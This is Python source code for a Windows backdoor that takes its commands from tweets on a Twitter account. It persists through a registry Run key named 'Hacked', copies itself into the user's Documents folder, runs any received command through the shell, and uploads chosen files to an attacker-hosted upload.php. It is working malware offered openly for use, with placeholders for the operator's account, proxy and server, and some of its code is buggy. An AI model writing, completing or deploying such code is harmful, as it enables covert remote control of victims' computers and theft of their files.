import requests
import subprocess
import time
import os
import shutil
import _winreg as wreg
import random
from bs4 import BeautifulSoup

url = "<twitter url of your account>"
tweetNumberFromTopRecent = 0        # the topmost tweet


def commandFromTwitter(url):
    response = requests.get(url=url, proxies={
        'http': "http://username:password@proxyaddress:proxyport"})
    soup = BeautifulSoup(response.text, 'html.parser')
    # For parsing the first tweet
    command = soup.find_all("p", {"class": "js-tweet-text"})[tweetNumberFromTopRecent].contents[0]
    return command


def persistence():
    path = os.getcwd().strip('\n')  # get the current working directory
    Null, userprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')  # Get userprofile

    # Place where you wish your backdoor to be copied , here it is C:\Users\<UserName>\Documents
    destination = userprof.strip('\n\r') + '\\Documents' + '\backdoor.exe'

    if not os.path.exists(destination):
        shutil.copyfile(path + '\backdoor.exe', destination)
        # This is one of the keys that allows to run on startup , others can be found using
        # sysinternals tools and other methods like googling
        key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",
                           0, wreg.KEY_ALL_ACCESS)
        # Hacked is the key name that will run our backdoor on startup , you can keep whatever you wish
        wreg.SetValueEx(key, 'Hacked', 0, wreg.REG_SZ, destination)
        key.Close()


def sendPost(Url, data, files=None):
    response = requests.post(url=Url, data=data, proxies={
        'http': "http://username:password@proxyaddress:proxyport"})
    return response


def getSysDetails():
    pass


def initialize():
    persistence()
    getSysDetails()     # send sysDetails on initialisation and set hostname for identifying bot


initialize()


def connect():
    while True:
        command = commandFromTwitter(url)
        print command

        if 'terminate' in command:
            return 1

        elif 'grab' in command:
            grab, path = command.split('*')
            if os.path.exists(path):
                newUrl = 'https://<your paid or free hosting site address >/upload.php'
                files = {'file': open(path, 'rb')}
                r = sendPost(newUrl, files=files)
            else:
                r = sendPost(newUrl, data='[-]File Not Found')

        else:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                                   stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            post_response = sendPost(url, CMD.stdout.read())
            post_response = sendPost(url, CMD.stderr.read())

        time.sleep(3)


while True:
    try:
        if connect() == 1:
            break  # 1 is the value against terminate command

    except:
        sleep_for = random.randrange(1, 10)
        time.sleep(sleep_for)  # 1 - 10 seconds wait time
        pass
